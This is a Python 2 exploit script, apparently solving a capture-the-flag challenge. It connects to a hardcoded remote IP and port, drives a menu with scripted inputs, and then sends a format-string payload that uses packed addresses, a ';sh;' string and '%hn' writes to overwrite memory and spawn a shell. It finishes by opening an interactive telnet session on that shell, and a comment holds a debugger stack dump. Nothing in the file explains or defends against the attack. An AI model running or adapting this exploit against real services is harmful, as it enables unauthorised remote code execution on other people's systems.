import struct
import socket
import telnetlib
def read_until(s,string):
	r = ""
	while not r.endswith(string):
		tmp = s.recv(1)
		if not tmp: break
		r += tmp
	return r
'''
0000| 0xffffcd1c --> 0xffffcd28 ('a' <repeats 27 times>)
0004| 0xffffcd20 --> 0xffffcf48 --> 0x0 
0008| 0xffffcd24 --> 0x8048817 (add    esp,0x88)
0012| 0xffffcd28 ('a' <repeats 27 times>)
0016| 0xffffcd2c ('a' <repeats 23 times>)
0020| 0xffffcd30 ('a' <repeats 19 times>)
0024| 0xffffcd34 ('a' <repeats 15 times>)
0028| 0xffffcd38 ('a' <repeats 11 times>)

'''
s = socket.create_connection(['112.166.114.136', 38961])
#s = socket.create_connection(['0', 1234])
print read_until(s,"$")
s.send('1\n')
read_until(s,'$')
s.send('1\n')
read_until(s,'$')
s.send('1\n')
read_until(s,'$')
s.send('3 3\n')
read_until(s,'$')
s.send('1\n')
read_until(s,'$')
s.send('3 3\n')
read_until(s,'$')
s.send('1\n')
read_until(s,'$')
s.send('3 3\n')
read_until(s,'$')
s.send('1\n')
read_until(s,'$')
s.send('3 3\n')
read_until(s,'$')
s.send('1\n')
read_until(s,'$')
s.send('3 3\n')

read_until(s,'name : ')
dat = ""
dat += struct.pack('<I',0x804c012)
dat += ";sh;"
dat += struct.pack('<I',0x804c010)
dat += "%1026c%1014c%hn%32140c%hn"
s.send(dat+'\n')
s.send('2\n')
read_until(s,'Exit')
s.send("2\n")
t = telnetlib.Telnet()
t.sock = s
t.interact()
